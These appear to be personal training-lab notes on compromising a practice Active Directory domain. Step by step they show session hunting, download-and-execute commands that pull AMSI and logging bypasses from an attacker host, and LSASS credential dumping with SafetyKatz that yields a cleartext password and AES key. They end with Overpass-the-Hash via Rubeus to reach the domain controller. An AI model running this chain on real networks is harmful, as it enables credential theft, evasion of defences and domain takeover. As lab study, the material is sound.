# dcorp/moneycorp AD Lab Notes — svcadmin Credential Abuse & Domain Admin Escalation

> Personal lab notes from a training exercise on the `dollarcorp.moneycorp.local` Active Directory pentest lab. Documented for reference and future write-ups.
>
> Order below follows the actual attack chain: **discover where a Domain Admin session lives → escalate a low-priv foothold to confirm it → gain access to that box → identify the service account's process → replay the credentials elsewhere.**

---

## Table of Contents
1. [Session Enumeration Techniques](#session-enumeration-techniques)
2. [Escalating to Domain Admin from a Reverse Shell on dcorp-ci](#escalating-to-domain-admin-from-a-reverse-shell-on-dcorp-ci)
3. [Full Chain — Compromising dcorp-mgmt to Extract svcadmin Creds](#full-chain--compromising-dcorp-mgmt-to-extract-svcadmin-creds)
4. [Flag 10 — Identifying the Process Running as svcadmin](#flag-10--identifying-the-process-running-as-svcadmin)
5. [OverPass-the-Hash — Replaying svcadmin Credentials via Rubeus](#overpass-the-hash--replaying-svcadmin-credentials-via-rubeus)
6. [Key Takeaways](#key-takeaways)

---

## Session Enumeration Techniques

Starting point: a machine where a **Domain Admin session is already available**, used to hunt for other privileged sessions across the domain.

### Invoke-SessionHunter

Uses the **Remote Registry** service (enabled by default on most Windows machines) to enumerate logged-on sessions — **no admin rights required on the remote targets**.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter -NoPortScan -RawResults | Select Hostname, UserSession, Access
```

Scoped to a target list for stealth (avoids noisy full-subnet scans):

```powershell
cat C:\AD\Tools\servers.txt
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | Select Hostname, UserSession, Access
```

**Finding:** A Domain Admin (`svcadmin`) session was visible on `dcorp-mgmt` — even without having access to the box yet. Session visibility ≠ access; that access is obtained later in the [Full Chain](#full-chain--compromising-dcorp-mgmt-to-extract-svcadmin-creds) section below.

---

## Escalating to Domain Admin from a Reverse Shell on dcorp-ci

Separate, independent foothold: a **Jenkins RCE reverse shell on dcorp-ci as `ciadmin`**, used to corroborate the finding above from a completely different starting point.

### Step 1 — Bypass AMSI & logging before running offensive tooling

Enhanced Script Block Logging is bypassed first so that the *subsequent* AMSI bypass isn't itself logged:

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/sbloggingbypass.txt')
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/Amsi-Byp.txt')
```

### Step 2 — Load PowerView

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')
```

### Step 3 — Hunt for Domain Admin sessions across the domain

```powershell
Find-DomainUserLocation
```

This walks reachable machines looking for sessions belonging to privileged (Domain Admin) group members — confirming the `svcadmin` session on `dcorp-mgmt` again, this time from a second, independent low-priv foothold.

---

## Full Chain — Compromising dcorp-mgmt to Extract svcadmin Creds

With `dcorp-mgmt` confirmed as hosting a Domain Admin (`svcadmin`) session, and WinRM reachable from the current foothold, the next step is direct command execution on the box.

**1. Confirm access:**
```powershell
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

**2. Stage the loader on the attack host, then copy it to dcorp-mgmt:**
```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

**3. Set up local port forwarding on dcorp-mgmt** (to fetch payloads without hitting the internet-facing IP directly, reducing detection surface):
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
> Note: piping `$null` into `winrs` avoids output-redirection errors with `netsh` over `winrs`.

**4. Run SafetyKatz in-memory via the Loader to dump credentials:**
```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

**Result:** Cleartext credentials and Kerberos keys for `svcadmin` — a Domain Admin — pulled straight from LSASS memory:

```
User Name         : svcadmin
Domain            : dcorp
SID               : S-1-5-21-719815819-3726368948-3917688648-1118
Password          : ThisisBlasphemyThisisMadness!!
aes256_hmac       : 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
```

`svcadmin` shows up here specifically because it's configured as the **logon account for a Windows service** (SQL Server) on this box — service account credentials sit resident in LSASS for as long as the service runs, making them a prime target for credential dumping.

---

## Flag 10 — Identifying the Process Running as svcadmin

**Goal:** Now that we have working `svcadmin` credentials, determine which process/service on `dcorp-mgmt` actually runs under that account.

### Step 1 — Open a PowerShell Remoting session to dcorp-mgmt

```powershell
Enter-PSSession -ComputerName dcorp-mgmt -Credential (Get-Credential)
```

When prompted, supply the credentials harvested above:

- **Username:** `dcorp\svcadmin`
- **Password:** `ThisisBlasphemyThisisMadness!!`

### Step 2 — Enumerate processes owned by svcadmin

```powershell
Get-Process -IncludeUserName | Where-Object { $_.UserName -match "svcadmin" }
```

Output:

```
Handles      WS(K)   CPU(s)     Id UserName               ProcessName
-------      -----   ------     -- --------               -----------
    807     263156     3.45   2156 dcorp\svcadmin         sqlservr
    716      86828     0.42   3400 dcorp\svcadmin         wsmprovhost
```

- `wsmprovhost` (PID 3400) is simply the WinRM host process created **because we are connected via `Enter-PSSession`** — it's a byproduct of our own remoting session, not the target answer.
- `sqlservr` (PID 2156) is the real finding: **Microsoft SQL Server** is running under the `svcadmin` account.

### Step 3 — Resolve the actual Windows service behind the process

`Get-Process` only shows the process name, not the underlying service name registered with the Service Control Manager. To get that:

```powershell
Get-WmiObject win32_service -Filter "processid=2156" | Select Name, DisplayName, StartName
```

This returns the **service name**, **display name**, and **the account the service logs on as** (`StartName`) — confirming `svcadmin` as the service's `LogOnAs` account. This is the actual answer expected for Flag 10 (the SQL Server service name/instance, not merely the process name `sqlservr`).

**Lesson learned:** `Get-Process -IncludeUserName` tells you *which account owns the process at runtime*, but `Get-WmiObject win32_service` tells you *which service is configured to run as that account* — for a flag asking specifically about a "service account," the WMI query is the more precise/expected step.

---

## OverPass-the-Hash — Replaying svcadmin Credentials via Rubeus

Rather than passing the cleartext password around, use the extracted **AES256 key** to request a Kerberos TGT directly (Overpass-the-Hash / Pass-the-Key) — this avoids ever touching NTLM and blends in as normal Kerberos traffic.

Run from an **elevated shell** on the student VM:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

What this does:
- `asktgt` — requests a TGT for `svcadmin` using the AES256 key (no password needed).
- `/opsec` — uses OPSEC-safe request flags to better mimic legitimate Windows Kerberos traffic.
- `/createnetonly:...cmd.exe` — spawns a new sandboxed process (`cmd.exe`) with a **NetOnly** logon, so the ticket is only used for *network* authentication, leaving the local session's identity untouched.
- `/ptt` — passes the ticket directly into the new process's ticket cache.

**Validate access to the DC using the new process:**
```cmd
winrs -r:dcorp-dc cmd /c set username
```

**Key point:** This was done **without ever needing direct network access from the student VM to dcorp-mgmt** — the credentials were harvested from dcorp-mgmt via winrs earlier, but the actual privilege replay/escalation happens straight against `dcorp-dc`, skipping dcorp-mgmt entirely on this leg.

---

## Key Takeaways

- **Session-hunting doesn't require admin access.** Tools like Invoke-SessionHunter (via Remote Registry) and PowerView's `Find-DomainUserLocation` let you locate privileged sessions across the domain before you ever have the rights to touch the machines they're on.
- **Multiple independent paths converged on the same target** (`dcorp-mgmt` / `svcadmin`) — once from session enumeration with existing DA access, and once from a completely separate low-priv foothold (Jenkins → dcorp-ci). This kind of redundancy is typical in real AD environments and is exactly why credential hygiene and service-account isolation matter.
- **Service accounts are high-value credential-dumping targets.** Because `svcadmin` ran SQL Server as a service, its credentials stayed resident in LSASS, making it dumpable via SafetyKatz/Mimikatz any time the service was running.
- **`Get-Process -IncludeUserName` vs `Get-WmiObject win32_service`:** the former tells you who *owns a running process*; the latter tells you which *service* is configured to log on as that account. For "service account" questions, the WMI/service query is the authoritative source.
- **AES keys > cleartext passwords for OPSEC.** Overpass-the-Hash with `/aes256` avoids weaker NTLM authentication and produces traffic that looks like normal Kerberos activity.
- **NetOnly sessions (`/createnetonly`)** let you use stolen credentials for network authentication only, without altering the local logon context — useful for staying under the radar on the box you're actually issuing commands from.

---

*Lab environment: `dollarcorp.moneycorp.local` — for educational/training purposes only.*
